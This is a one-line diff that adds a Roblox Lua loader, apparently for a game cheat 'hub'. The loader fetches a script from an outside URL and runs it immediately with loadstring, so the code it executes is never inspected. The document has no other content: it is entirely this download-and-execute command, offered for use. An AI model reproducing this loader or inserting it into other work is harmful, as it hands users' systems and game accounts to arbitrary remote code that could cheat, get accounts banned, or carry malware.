@@ -1,0 +1,1 @@
+loadstring(game:HttpGetAsync('https://riptxde.dev/u/hub/script.lua'))()
